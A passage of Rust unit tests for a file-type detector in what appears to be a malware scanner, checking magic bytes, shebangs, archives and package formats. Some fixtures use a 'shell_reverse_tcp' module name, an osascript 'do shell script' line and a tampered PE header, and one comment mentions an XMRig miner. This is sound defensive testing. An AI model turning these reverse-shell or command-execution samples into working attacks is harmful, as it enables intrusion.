fn is_svg(data: &[u8]) -> bool {
    detect_xml(data).map(|(ft, _)| ft) == Some(FileType::Svg)
}

#[test]
fn go_mod_content_signature_is_bounded_and_specific() {
    assert!(looks_like_go_mod(
        b"// generated\r\n\r\nmodule example.org/shell_reverse_tcp // module path\r\ngo 1.23.4\r\n"
    ));
    assert!(looks_like_go_mod(b"module shell_reverse_tcp\n"));
    assert!(looks_like_go_mod(b"module\texample.org/tool\n"));
    assert!(!looks_like_go_mod(
        b"module shell_reverse_tcp is a phrase\n"
    ));
    assert!(!looks_like_go_mod(b"module example.org//tool\n"));
    assert!(!looks_like_go_mod(b"module ./relative\n"));
    assert!(!looks_like_go_mod(b"module \"\n"));
    assert!(!looks_like_go_mod(b"export module shell_reverse_tcp;\n"));
    assert!(!looks_like_go_mod(
        b"// module shell_reverse_tcp\npackage main\n"
    ));
}

#[test]
fn go_mod_content_signature_only_needs_the_prefix() {
    let mut data = b"module example.org/tool\ngo 1.23\n".to_vec();
    data.resize(GO_MOD_HEAD_LIMIT + 256, b' ');
    assert!(looks_like_go_mod(&data));
}

#[test]
fn svg_root_needs_a_doctype_that_names_svg() {
    // The `<!DOCTYPE …>` allowance exists for `<!DOCTYPE svg PUBLIC …>`.
    // Accepting any doctype and then hunting for `<svg` in the first
    // kilobyte typed every HTML page with an inline icon as an image,
    // which skipped every HTML rule for it.
    assert!(is_svg(
        b"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg xmlns=\"x\"/>"
    ));
    assert!(!is_svg(b"<!DOCTYPE html>\n<svg xmlns=\"x\"></svg>"));
    // A `<?xml` prolog is still a legitimate preamble for a real SVG.
    assert!(is_svg(b"<?xml version=\"1.0\"?>\n<svg xmlns=\"x\"/>"));
}

#[test]
fn svg_root_yields_to_an_enclosing_html_element() {
    // XHTML reaches the prolog branch, so the doctype check alone does
    // not settle it. An `<html>` ahead of the `<svg>` does.
    assert!(!is_svg(
        b"<?xml version=\"1.0\"?>\n<html xmlns=\"x\"><body><svg width=\"9\"></svg>"
    ));
    assert!(!is_svg(b"<!DOCTYPE svg><html><svg ></svg>"));
}

#[test]
fn svg_root_ignores_a_document_with_no_svg_at_all() {
    assert!(!is_svg(b"<?xml version=\"1.0\"?>\n<rss version=\"2.0\">"));
    assert!(!is_svg(b"plain text"));
}
use super::*;

#[test]
fn elf_magic() {
    let data = b"\x7fELF\x02\x01\x01\x00";
    let (ft, src) = detect_from_content(Path::new("a.out"), data).unwrap();
    assert_eq!(ft, FileType::Elf);
    assert_eq!(src, DetectionSource::Magic);
}

#[test]
fn pe_magic() {
    let data = b"MZ\x90\x00\x03\x00\x00\x00";
    let (ft, _) = detect_from_content(Path::new("app.exe"), data).unwrap();
    assert_eq!(ft, FileType::Pe);
}

#[test]
fn macho_64() {
    let data = [0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0];
    let (ft, _) = detect_from_content(Path::new("binary"), &data).unwrap();
    assert_eq!(ft, FileType::MachO);
}

#[test]
fn java_class_vs_macho_fat() {
    let java = [0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 52];
    let (ft, _) = detect_from_content(Path::new("Main.class"), &java).unwrap();
    assert_eq!(ft, FileType::JavaClass);

    let macho = [0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x02];
    let (ft, _) = detect_from_content(Path::new("universal"), &macho).unwrap();
    assert_eq!(ft, FileType::MachO);
}

/// Junk file shaped like CAFEBABE whose `major_version` falls
/// outside the Java range AND whose `nfat_arch` is implausibly
/// large. Pre-fix, this classified as Mach-O and the fat parser
/// then sliced with a multi-gigabyte start offset → panic. We now
/// treat it as a Java class so the lenient class parser handles
/// it (and bails cleanly when the body doesn't match).
#[test]
fn cafebabe_with_implausible_nfat_arch_falls_back_to_java() {
    // bytes[4..8] = 0x4D 0x11 0xAB 0xD4 — nfat_arch ≈ 1.29 billion
    // and major_version = 0xABD4 (44_000), both outside their
    // respective sane ranges.
    let junk = [0xCA, 0xFE, 0xBA, 0xBE, 0x4D, 0x11, 0xAB, 0xD4];
    let (ft, _) = detect_from_content(Path::new("anon.class"), &junk).unwrap();
    assert_eq!(ft, FileType::JavaClass);
}

#[test]
fn shebang_bash() {
    let data = b"#!/bin/bash\necho hello\n";
    let (ft, src) = detect_from_content(Path::new("script"), data).unwrap();
    assert_eq!(ft, FileType::Shell);
    assert_eq!(src, DetectionSource::Shebang);
}

#[test]
fn shebang_after_blank_lines() {
    let data = b"\n\n#!/bin/bash\nset -e\necho hello\n";
    let (ft, src) = detect_from_content(Path::new("linux"), data).unwrap();
    assert_eq!(ft, FileType::Shell);
    assert_eq!(src, DetectionSource::Shebang);

    let padded = [&[b' '; 80][..], b"#!/bin/sh\necho hi\n"].concat();
    assert!(
        detect_from_content(Path::new("x"), &padded)
            .is_none_or(|(_, src)| src != DetectionSource::Shebang)
    );
}

#[test]
fn shebang_python() {
    let data = b"#!/usr/bin/env python3\nimport sys\n";
    let (ft, src) = detect_from_content(Path::new("tool"), data).unwrap();
    assert_eq!(ft, FileType::Python);
    assert_eq!(src, DetectionSource::Shebang);
}

#[test]
fn shebang_env_with_flags() {
    let data = b"#!/usr/bin/env python3 -u\nimport sys\n";
    let (ft, _) = detect_from_content(Path::new("tool"), data).unwrap();
    assert_eq!(ft, FileType::Python);
}

#[test]
fn shebang_direct_path() {
    let data = b"#!/usr/local/bin/perl\nuse strict;\n";
    let (ft, _) = detect_from_content(Path::new("script"), data).unwrap();
    assert_eq!(ft, FileType::Perl);
}

#[test]
fn shebang_node() {
    let data = b"#!/usr/bin/env node\nconsole.log('hi');\n";
    let (ft, _) = detect_from_content(Path::new("script"), data).unwrap();
    assert_eq!(ft, FileType::JavaScript);
}

/// Shebang lines that named their interpreter but were left untyped, so
/// every language-gated rule skipped the script.
#[test]
fn shebang_variants() {
    let cases: &[(&[u8], FileType)] = &[
        // CRLF line endings: the `\r` is not part of the interpreter name.
        (b"#!/usr/bin/perl\r\nuse Socket;\r\n", FileType::Perl),
        (b"#!/bin/bash\r\necho hi\r\n", FileType::Shell),
        (b"#!/usr/bin/env python3\r\nimport os\r\n", FileType::Python),
        (
            b"\xEF\xBB\xBF#!/usr/bin/perl\r\nuse Socket;\r\n",
            FileType::Perl,
        ),
        (b"\xEF\xBB\xBF#!/bin/bash\r\necho hi\r\n", FileType::Shell),
        // A `/` in an argument is not the interpreter path.
        (b"#!/usr/bin/perl -I/opt/lib\nuse Socket;\n", FileType::Perl),
        (b"#!/bin/bash --rcfile /etc/x\necho hi\n", FileType::Shell),
        // env is found by basename, after whitespace, with its options.
        (b"#!/usr/local/bin/env perl\n", FileType::Perl),
        (b"#!/bin/env ruby\n", FileType::Ruby),
        (b"#! /usr/bin/env perl\n", FileType::Perl),
        (b"#!/usr/bin/env -S perl -w\n", FileType::Perl),
        (b"#!/usr/bin/env -u HOME LANG=C perl\n", FileType::Perl),
        (b"#!/bin/busybox sh\n", FileType::Shell),
        // Versioned interpreter names.
        (b"#!/usr/bin/perl5.36\n", FileType::Perl),
        (b"#!/usr/bin/python3.11\n", FileType::Python),
        (b"#!/usr/bin/ksh93\n", FileType::Shell),
        // Interpreters for types that already existed.
        (b"#!/usr/bin/env pwsh\n", FileType::PowerShell),
        (
            b"#!/usr/bin/osascript\ndo shell script \"id\"\n",
            FileType::AppleScript,
        ),
        (
            b"#!/usr/bin/osascript -l JavaScript\nApplication('Finder')\n",
            FileType::JavaScript,
        ),
    ];
    for (data, want) in cases {
        let got = detect_from_content(Path::new("script"), data);
        assert_eq!(
            got,
            Some((*want, DetectionSource::Shebang)),
            "{}",
            String::from_utf8_lossy(data).escape_debug()
        );
    }
}

#[test]
fn shebang_without_interpreter() {
    for data in [
        &b"#!\n"[..],
        b"#! \r\n",
        b"#!/usr/bin/env\n",
        b"#!/usr/bin/env -S\n",
        b"#!/opt/x/unknown\n",
    ] {
        assert_eq!(
            detect_shebang(data),
            None,
            "{}",
            String::from_utf8_lossy(data).escape_debug()
        );
    }
}

#[test]
fn png_magic() {
    let data = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR";
    let (ft, _) = detect_from_content(Path::new("image.png"), data).unwrap();
    assert_eq!(ft, FileType::Png);
}

#[test]
fn jpeg_magic() {
    let data = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10];
    let (ft, _) = detect_from_content(Path::new("photo.jpg"), &data).unwrap();
    assert_eq!(ft, FileType::Jpeg);
}

#[test]
fn ole2_magic() {
    let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    data.extend_from_slice(&[0; 100]);
    let (ft, _) = detect_from_content(Path::new("doc.doc"), &data).unwrap();
    assert_eq!(ft, FileType::OleDoc);
    let (ft, _) = detect_from_content(Path::new("setup.msi"), &data).unwrap();
    assert_eq!(ft, FileType::Msi);
    let (ft, _) = detect_from_content(Path::new("patch.msp"), &data).unwrap();
    assert_eq!(ft, FileType::Msi);
    let (ft, _) = detect_from_content(Path::new("custom.mst"), &data).unwrap();
    assert_eq!(ft, FileType::Msi);
}

#[test]
fn plist_xml() {
    let data = b"<?xml version=\"1.0\"?>\n<!DOCTYPE plist PUBLIC>";
    let (ft, _) = detect_from_content(Path::new("Info.plist"), data).unwrap();
    assert_eq!(ft, FileType::Plist);
}

#[test]
fn nib_archive() {
    let data = b"NIBArchive\x01\x00\x00\x00\x0a\x00\x00\x00";
    let (ft, src) = detect_from_content(Path::new("MainMenu.nib"), data).unwrap();
    assert_eq!(ft, FileType::Nib);
    assert_eq!(src, DetectionSource::Magic);
    // The magic alone identifies it; the name is not consulted.
    let (ft, _) = detect_from_content(Path::new("payload.bin"), data).unwrap();
    assert_eq!(ft, FileType::Nib);
}

#[test]
fn nib_keyed_archive_types_as_plist() {
    // A keyed-archive nib (NSKeyedArchiver bplist inside an older nib
    // bundle) is still a plain property list on disk, regardless of the
    // `.nib` extension -- type it Plist so plist-aware rules can address
    // it. Only the distinct NIBArchive binary format keeps FileType::Nib.
    let data = b"bplist00\x00\x00\x00\x00";
    let (ft, _) = detect_from_content(Path::new("keyedobjects.nib"), data).unwrap();
    assert_eq!(ft, FileType::Plist);
    let (ft, _) = detect_from_content(Path::new("Objects.NIB"), data).unwrap();
    assert_eq!(ft, FileType::Plist);
    let (ft, _) = detect_from_content(Path::new("prefs"), data).unwrap();
    assert_eq!(ft, FileType::Plist);
}

#[test]
fn plist_binary() {
    let data = b"bplist00\x00\x00\x00\x00";
    let (ft, _) = detect_from_content(Path::new("prefs"), data).unwrap();
    assert_eq!(ft, FileType::Plist);
}

#[test]
fn rar_archive() {
    let data = b"Rar!\x1a\x07\x01\x00";
    let (ft, _) = detect_from_content(Path::new("archive.rar"), data).unwrap();
    assert_eq!(ft, FileType::Rar);
}

/// Build a Unix `ar` archive from `(member_name, data)` pairs.
fn ar_archive(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut out = b"!<arch>\n".to_vec();
    for (name, data) in members {
        let header = format!(
            "{:<16}{:<12}{:<6}{:<6}{:<8}{:<10}",
            name,
            "0",
            "0",
            "0",
            "100644",
            data.len()
        );
        out.extend_from_slice(header.as_bytes());
        out.extend_from_slice(b"`\n");
        out.extend_from_slice(data);
        if data.len() % 2 == 1 {
            out.push(b'\n'); // members are 2-byte aligned
        }
    }
    out
}

#[test]
fn ar_debian_binary_is_deb() {
    // A `.deb` always leads with the `debian-binary` member. Detect by
    // magic alone (extensionless path) to exercise the member peek.
    let deb = ar_archive(&[("debian-binary", b"2.0\n"), ("control.tar.gz", b"xx")]);
    let (ft, _) = detect_from_content(Path::new("mystery"), &deb).unwrap();
    assert_eq!(ft, FileType::Deb);

    // GNU `ar` slash-terminates member names; still a Deb.
    let deb_slash = ar_archive(&[("debian-binary/", b"2.0\n")]);
    let (ft, _) = detect_from_content(Path::new("mystery"), &deb_slash).unwrap();
    assert_eq!(ft, FileType::Deb);
}

#[test]
fn ar_static_library_is_not_deb() {
    // A static library (.a) leads with a symbol table (`/`) or an object
    // member — never `debian-binary`. It must NOT be mis-typed as `Deb`
    // (which sent libcurl.a et al. down the Debian-package extractor and
    // exposed their object bytes to archive-family content rules).
    let lib = ar_archive(&[("/", b"symtab.."), ("curl_ftp.o/", b"\x7fELF....")]);
    let (ft, _) = detect_from_content(Path::new("mystery"), &lib).unwrap();
    assert_eq!(ft, FileType::StaticLib);
}

#[test]
fn gzip_plain() {
    let data = [0x1f, 0x8b, 0x08, 0x00];
    let (ft, _) = detect_from_content(Path::new("data.gz"), &data).unwrap();
    assert_eq!(ft, FileType::Gz);
}

#[test]
fn gzip_tar() {
    let data = [0x1f, 0x8b, 0x08, 0x00];
    let (ft, _) = detect_from_content(Path::new("data.tar.gz"), &data).unwrap();
    assert_eq!(ft, FileType::TarGz);
}

#[test]
fn zip_archive() {
    let data = b"PK\x03\x04some content here";
    let (ft, _) = detect_from_content(Path::new("data.zip"), data).unwrap();
    assert_eq!(ft, FileType::Zip);
}

#[test]
fn cab_archive() {
    let data = b"MSCF\x00\x00\x00\x00cabinet content";
    let (ft, _) = detect_from_content(Path::new("archive.cab"), data).unwrap();
    assert_eq!(ft, FileType::Cab);
}

#[test]
fn dex_bytecode() {
    let data = b"dex\n035\0payload";
    let (ft, _) = detect_from_content(Path::new("classes.dex"), data).unwrap();
    assert_eq!(ft, FileType::Dex);
}

#[test]
fn jar_detected_as_jar() {
    let data = b"PK\x03\x04jar content here";
    let (ft, _) = detect_from_content(Path::new("lib.jar"), data).unwrap();
    assert_eq!(ft, FileType::Jar);
}

#[test]
fn apk_android_is_zip() {
    // `.apk` + ZIP magic → Android package (never the Alpine gzip form).
    let data = b"PK\x03\x04android apk content";
    let (ft, _) = detect_from_content(Path::new("app.apk"), data).unwrap();
    assert_eq!(ft, FileType::ApkAndroid);
}

#[test]
fn apk_alpine_is_gzip_tar() {
    // `.apk` + gzip magic → Alpine package, disambiguated from Android by
    // container magic alone (no member peek).
    let data = [0x1f, 0x8b, 0x08, 0x00];
    let (ft, _) = detect_from_content(Path::new("musl-1.2.4.apk"), &data).unwrap();
    assert_eq!(ft, FileType::ApkAlpine);
}

#[test]
fn macos_pkg_is_xar() {
    let data = b"xar!\x00\x1c\x00\x01";
    let (ft, _) = detect_from_content(Path::new("installer.pkg"), data).unwrap();
    assert_eq!(ft, FileType::PkgMacos);
}

#[test]
fn ooxml_by_extension() {
    // With the OPC marker the extension is believed; without it the file
    // is what it is, which is a zip.
    let data = b"PK\x03\x04[Content_Types].xml";
    let (ft, _) = detect_from_content(Path::new("report.docx"), data).unwrap();
    assert_eq!(ft, FileType::Ooxml);
    let plain = b"PK\x03\x04some office content";
    let (ft, _) = detect_from_content(Path::new("report.docx"), plain).unwrap();
    assert_eq!(ft, FileType::Zip);
}

#[test]
fn ooxml_by_content_types() {
    let mut data = b"PK\x03\x04".to_vec();
    data.extend_from_slice(b"[Content_Types].xml");
    let (ft, _) = detect_from_content(Path::new("report.txt"), &data).unwrap();
    assert_eq!(ft, FileType::Ooxml);
}

#[test]
fn vsix_by_manifest_without_extension() {
    let mut data = b"PK\x03\x04".to_vec();
    data.extend_from_slice(b"extension.vsixmanifest\0[Content_Types].xml");
    let (ft, _) = detect_from_content(Path::new("artifact.sample"), &data).unwrap();
    assert_eq!(ft, FileType::Vsix);
}

#[test]
fn msix_by_manifest_without_extension() {
    let zip = zip_of(&[
        ("PythonRuntime/python.exe", b"MZ"),
        ("AppxManifest.xml", b"<Package/>"),
        ("[Content_Types].xml", b"<Types/>"),
        ("AppxSignature.p7x", b""),
    ]);
    assert_eq!(
        classify_pk(Path::new("FkSA3WUIlyfC"), &zip).0,
        FileType::Zip
    );
    let bundle = zip_of(&[
        ("AppxMetadata/AppxBundleManifest.xml", b"<Bundle/>"),
        ("[Content_Types].xml", b"<Types/>"),
    ]);
    assert_eq!(
        classify_pk(Path::new("bundle.bin"), &bundle).0,
        FileType::Zip
    );
}

#[test]
fn msix_bundle_manifest_past_the_entry_cap_is_still_a_zip() {
    let mut entries: Vec<(String, &[u8])> = (0..ZipNames::MAX_ENTRIES + 10)
        .map(|i| (format!("App_{i}.msix"), &b""[..]))
        .collect();
    entries.push(("AppxMetadata/AppxBundleManifest.xml".into(), b"<Bundle/>"));
    entries.push(("[Content_Types].xml".into(), b"<Types/>"));
    let refs: Vec<(&str, &[u8])> = entries.iter().map(|(n, b)| (n.as_str(), *b)).collect();
    let zip = zip_of(&refs);
    assert_eq!(classify_pk(Path::new("bundle"), &zip).0, FileType::Zip);
}

/// The APPX marker must not pull a real Office document out of Ooxml.
#[test]
fn office_document_without_appx_manifest_stays_ooxml() {
    let docx = zip_of(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", b"<w:document/>"),
    ]);
    assert_eq!(classify_pk(Path::new("report"), &docx).0, FileType::Ooxml);
}

#[test]
fn msix_manifest_past_the_entry_cap_is_still_a_zip() {
    let mut entries: Vec<(String, &[u8])> = (0..ZipNames::MAX_ENTRIES + 10)
        .map(|i| (format!("VFS/f{i}.pyc"), &b""[..]))
        .collect();
    entries.push(("AppxManifest.xml".into(), b"<Package/>"));
    entries.push(("[Content_Types].xml".into(), b"<Types/>"));
    let refs: Vec<(&str, &[u8])> = entries.iter().map(|(n, b)| (n.as_str(), *b)).collect();
    let zip = zip_of(&refs);
    assert_eq!(
        classify_pk(Path::new("FkSA3WUIlyfC"), &zip).0,
        FileType::Zip
    );
}

#[test]
fn php_opening_tag() {
    let data = b"<?php\necho 'hello';\n";
    let (ft, _) = detect_from_content(Path::new("page"), data).unwrap();
    assert_eq!(ft, FileType::Php);
}

#[test]
fn tampered_pe() {
    let mut data = vec![0x00; 256];
    data[5] = b'M';
    data[6] = b'Z';
    let e_lfanew: u32 = 0x80;
    data[5 + 0x3C] = (e_lfanew & 0xFF) as u8;
    data[5 + 0x3D] = 0;
    data[5 + 0x3E] = 0;
    data[5 + 0x3F] = 0;
    let pe_sig_offset = 5 + e_lfanew as usize;
    if pe_sig_offset + 4 <= data.len() {
        data[pe_sig_offset] = b'P';
        data[pe_sig_offset + 1] = b'E';
        data[pe_sig_offset + 2] = 0;
        data[pe_sig_offset + 3] = 0;
    }
    let (ft, _) = detect_from_content(Path::new("suspicious"), &data).unwrap();
    assert_eq!(ft, FileType::Pe);
}

#[test]
fn chrome_manifest() {
    let data = br#"{"manifest_version": 3, "permissions": ["storage"]}"#;
    let (ft, _) = detect_from_content(Path::new("manifest.json"), data).unwrap();
    assert_eq!(ft, FileType::ChromeManifest);
}

#[test]
fn lnk_magic() {
    let mut data = LNK_MAGIC.to_vec();
    data.extend_from_slice(&[0; 100]);
    let (ft, _) = detect_from_content(Path::new("shortcut.lnk"), &data).unwrap();
    assert_eq!(ft, FileType::Lnk);
}

#[test]
fn python_bytecode() {
    let data = [0x42, 0x0D, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00];
    let (ft, _) = detect_from_content(Path::new("module.pyc"), &data).unwrap();
    assert_eq!(ft, FileType::PythonBytecode);
}

#[test]
fn beam_bytecode() {
    // IFF container: `FOR1` <u32 size> `BEAM`
    let data = *b"FOR1\x00\x00\x40\x08BEAMAtU8";
    let (ft, src) = detect_from_content(Path::new("gb_trees.beam"), &data).unwrap();
    assert_eq!(ft, FileType::Beam);
    assert_eq!(src, DetectionSource::Magic);
}

#[test]
fn for1_without_beam_is_not_beam() {
    // `FOR1` IFF header for a non-BEAM form (e.g. AIFF would be `FORM`) must not match.
    let data = *b"FOR1\x00\x00\x00\x08AIFFxxxx";
    assert!(detect_from_content(Path::new("x"), &data).is_none());
}

#[test]
fn zstd_archive() {
    let data = [0x28, 0xB5, 0x2F, 0xFD, 0x00, 0x00];
    let (ft, _) = detect_from_content(Path::new("data.zst"), &data).unwrap();
    assert_eq!(ft, FileType::Zst);
}

#[test]
fn freebsd_pkg_zstd_archive() {
    let data = {
        let mut tar = tar::Builder::new(Vec::new());
        let mut h = tar::Header::new_ustar();
        h.set_path("+COMPACT_MANIFEST").unwrap();
        h.set_size(7);
        h.set_cksum();
        tar.append(&h, &b"payload"[..]).unwrap();
        zstd::encode_all(&tar.into_inner().unwrap()[..], 3).unwrap()
    };
    let (ft, _) = detect_from_content(Path::new("BerkeleyGW-4.0_2.pkg"), &data).unwrap();
    assert_eq!(ft, FileType::PkgFreebsd);
}

/// Build a gzip-compressed tar from `(path, body)` members.
fn build_gzip_tar(members: &[(&str, &[u8])]) -> Vec<u8> {
    use std::io::Write;
    let mut tar = Vec::new();
    {
        let mut b = tar::Builder::new(&mut tar);
        for (path, body) in members {
            let mut h = tar::Header::new_ustar();
            h.set_path(path).unwrap();
            h.set_size(body.len() as u64);
            h.set_cksum();
            b.append(&h, &body[..]).unwrap();
        }
        b.finish().unwrap();
    }
    let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    e.write_all(&tar).unwrap();
    e.finish().unwrap()
}

/// Build an uncompressed tar from `(path, body)` members.
fn build_plain_tar(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut tar = Vec::new();
    {
        let mut b = tar::Builder::new(&mut tar);
        for (path, body) in members {
            let mut h = tar::Header::new_ustar();
            h.set_path(path).unwrap();
            h.set_size(body.len() as u64);
            h.set_cksum();
            b.append(&h, &body[..]).unwrap();
        }
        b.finish().unwrap();
    }
    tar
}

#[test]
fn python_sdist_detected_by_pkg_info() {
    let gz = build_gzip_tar(&[
        ("requests-2.31.0/setup.py", b"setup()"),
        ("requests-2.31.0/requests/__init__.py", b"# pkg"),
        ("requests-2.31.0/PKG-INFO", b"Name: requests\n"),
    ]);
    let (ft, _) = detect_from_content(Path::new("requests-2.31.0.tar.gz"), &gz).unwrap();
    assert_eq!(ft, FileType::PythonSdist);

    // A single-rooted gzip tar without PKG-INFO stays a generic tar.gz.
    let plain = build_gzip_tar(&[("proj-1.0/README", b"hi"), ("proj-1.0/main.c", b"int")]);
    let (ft, _) = detect_from_content(Path::new("proj-1.0.tar.gz"), &plain).unwrap();
    assert_eq!(ft, FileType::TarGz);
}

#[test]
fn python_sdist_pkg_info_may_follow_large_source_tree() {
    let padding = vec![0u8; (8 << 20) + 1];
    let gz = build_gzip_tar(&[
        ("generated-1.0/src/generated/client.py", &padding),
        ("generated-1.0/PKG-INFO", b"Name: generated\n"),
    ]);
    let (ft, _) = detect_from_content(Path::new("content-addressed.sample"), &gz).unwrap();
    assert_eq!(ft, FileType::PythonSdist);
}

#[test]
fn arch_pkg_non_zstd_by_extension() {
    // The `.pkg.tar.{xz,gz}` extension is Arch-specific; content can't always
    // be read (no xz decompressor), so the extension is authoritative.
    let gz = build_gzip_tar(&[
        (".PKGINFO", b"pkgname = foo\n"),
        ("usr/bin/foo", b"\x7fELF"),
    ]);
    let (ft, _) = detect_from_content(Path::new("foo-1.0-1-x86_64.pkg.tar.gz"), &gz).unwrap();
    assert_eq!(ft, FileType::PkgArch);

    let xz = b"\xfd7zXZ\x00\x00\x00rest-of-stream";
    let (ft, _) = detect_from_content(Path::new("foo-1.0-1-x86_64.pkg.tar.xz"), xz).unwrap();
    assert_eq!(ft, FileType::PkgArch);
}

#[test]
fn oci_layout_and_docker_save_detected() {
    // OCI image layout: oci-layout + index.json.
    let oci = build_plain_tar(&[
        ("oci-layout", br#"{"imageLayoutVersion":"1.0.0"}"#),
        ("index.json", br#"{"manifests":[]}"#),
        ("blobs/sha256/abc", b"blob"),
    ]);
    let (ft, _) = detect_from_content(Path::new("image.tar"), &oci).unwrap();
    assert_eq!(ft, FileType::OciImage);

    // docker save bundle: manifest.json + a layer tar.
    let docker = build_plain_tar(&[
        ("deadbeef/layer.tar", b"layer"),
        ("config.json", b"{}"),
        ("manifest.json", br#"[{"RepoTags":["x:1"]}]"#),
    ]);
    let (ft, _) = detect_from_content(Path::new("saved.tar"), &docker).unwrap();
    assert_eq!(ft, FileType::OciImage);

    // A plain tar with neither marker pair is a generic tar. This used to
    // assert `is_none()` -- the ustar branch bailed and Stage 4 recovered
    // the type from the `.tar` extension. The resulting FileType was the
    // same; only the DetectionSource differed. Asserting the type keeps
    // the guarantee that actually matters (an OCI bundle is not a plain
    // tar) without pinning the stage that supplies it.
    let plain = build_plain_tar(&[("README", b"hi"), ("src/main.rs", b"fn main(){}")]);
    let (ft, _) = detect_from_content(Path::new("plain.tar"), &plain).unwrap();
    assert_eq!(ft, FileType::Tar);
}

#[test]
fn ustar_tar_detected_regardless_of_extension() {
    // The ustar signature at offset 257 identifies a tar on its own, so a
    // tar is walked whatever it is named. Previously only `.tar` was
    // recognized and the same bytes under any other extension were typed
    // Data and never descended into -- an XMRig release tarball named
    // `<sha256>.bin` produced one finding instead of six.
    let plain = build_plain_tar(&[("README", b"hi"), ("src/main.rs", b"fn main(){}")]);
    for name in ["payload.bin", "image.png", "noextension"] {
        let (ft, src) = detect_from_content(Path::new(name), &plain)
            .unwrap_or_else(|| panic!("{name} was not detected as a tar"));
        assert_eq!(ft, FileType::Tar, "{name}");
        assert_eq!(src, DetectionSource::Magic, "{name}");
    }

    // `.gem` is also an uncompressed ustar tar and has no magic of its
    // own, so the extension must keep naming it.
    assert!(!matches!(
        detect_from_content(Path::new("rails.gem"), &plain),
        Some((FileType::Tar, _))
    ));
}

#[test]
fn pkg_zstd_without_manifest_is_not_freebsd() {
    // A `.pkg`-named zstd stream whose leading bytes aren't the FreeBSD
    // manifest marker must not be claimed as a FreeBSD package.
    let data = zstd::encode_all(&b"usr/local/bin/whatever\0payload"[..], 3).unwrap();
    let (ft, _) = detect_from_content(Path::new("notpkg.pkg"), &data).unwrap();
    assert_eq!(ft, FileType::Zst);
}

#[test]
fn crate_is_gzip_tar() {
    // `.crate` is cargo-specific; gzip magic + extension suffices.
    let data = [0x1f, 0x8b, 0x08, 0x00];
    let (ft, _) = detect_from_content(Path::new("serde-1.0.0.crate"), &data).unwrap();
    assert_eq!(ft, FileType::Crate);
}

#[test]
fn npm_tgz_detected_by_package_prefix() {
    // npm tarballs put everything under `package/`; build a real gzip tar
    // so the marker peek runs.
    let mut tar = Vec::new();
    {
        let mut b = tar::Builder::new(&mut tar);
        // macOS `tar` smuggles an AppleDouble `._package` sidecar in as the
        // first entry; the peek must skip it rather than bail.
        let mut sidecar = tar::Header::new_ustar();
        sidecar.set_path("._package").unwrap();
        sidecar.set_size(0);
        sidecar.set_cksum();
        b.append(&sidecar, std::io::empty()).unwrap();
        // Real `tar` emits the `package/` directory entry first; the peek
        // must tolerate it (its path arrives without the trailing slash).
        let mut dir = tar::Header::new_ustar();
        dir.set_path("package/").unwrap();
        dir.set_size(0);
        dir.set_entry_type(tar::EntryType::Directory);
        dir.set_cksum();
        b.append(&dir, std::io::empty()).unwrap();
        let body = br#"{"name":"demo","version":"1.0.0"}"#;
        let mut h = tar::Header::new_ustar();
        h.set_path("package/package.json").unwrap();
        h.set_size(body.len() as u64);
        h.set_cksum();
        b.append(&h, &body[..]).unwrap();
        b.finish().unwrap();
    }
    let gz = {
        use std::io::Write;
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(&tar).unwrap();
        e.finish().unwrap()
    };
    let (ft, _) = detect_from_content(Path::new("demo-1.0.0.tgz"), &gz).unwrap();
    assert_eq!(ft, FileType::Npm);

    // A `.tgz` without the `package/` layout stays a generic gzip tar.
    let plain = build_gzip_tar(&[("README", b"hi"), ("src/main.c", b"int")]);
    let (ft, _) = detect_from_content(Path::new("blob.tgz"), &plain).unwrap();
    assert_eq!(ft, FileType::TarGz);

    // One that decodes to something other than a tar is a plain gzip,
    // whatever it is called: the content has spoken.
    let not_tar = {
        use std::io::Write;
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(b"not a tar").unwrap();
        e.finish().unwrap()
    };
    let (ft, _) = detect_from_content(Path::new("blob.tgz"), &not_tar).unwrap();
    assert_eq!(ft, FileType::Gz);
}

#[test]
fn npm_tgz_with_manifest_after_source_tree() {
    // Some packers order `package/package.json` after the whole source
    // tree instead of near the front. Detection must still scan past those
    // entries rather than give up on a fixed member budget.
    let mut tar = Vec::new();
    {
        let mut b = tar::Builder::new(&mut tar);
        for i in 0..40 {
            let body = b"// source\n";
            let mut h = tar::Header::new_ustar();
            h.set_path(format!("package/lib/file{i}.js")).unwrap();
            h.set_size(body.len() as u64);
            h.set_cksum();
            b.append(&h, &body[..]).unwrap();
        }
        let body = br#"{"name":"demo","version":"1.0.0"}"#;
        let mut h = tar::Header::new_ustar();
        h.set_path("package/package.json").unwrap();
        h.set_size(body.len() as u64);
        h.set_cksum();
        b.append(&h, &body[..]).unwrap();
        b.finish().unwrap();
    }
    let gz = {
        use std::io::Write;
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(&tar).unwrap();
        e.finish().unwrap()
    };
    let (ft, _) = detect_from_content(Path::new("demo-1.0.0.tgz"), &gz).unwrap();
    assert_eq!(ft, FileType::Npm);
}

#[test]
fn package_layout_without_manifest_stays_targz() {
    // Everything under `package/` but no `package/package.json` is not a
    // valid npm package — it must fall back to a generic gzip tar rather
    // than being mislabeled npm.
    let mut tar = Vec::new();
    {
        let mut b = tar::Builder::new(&mut tar);
        let body = b"data";
        let mut h = tar::Header::new_ustar();
        h.set_path("package/readme.txt").unwrap();
        h.set_size(body.len() as u64);
        h.set_cksum();
        b.append(&h, &body[..]).unwrap();
        b.finish().unwrap();
    }
    let gz = {
        use std::io::Write;
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(&tar).unwrap();
        e.finish().unwrap()
    };
    let (ft, _) = detect_from_content(Path::new("blob.tgz"), &gz).unwrap();
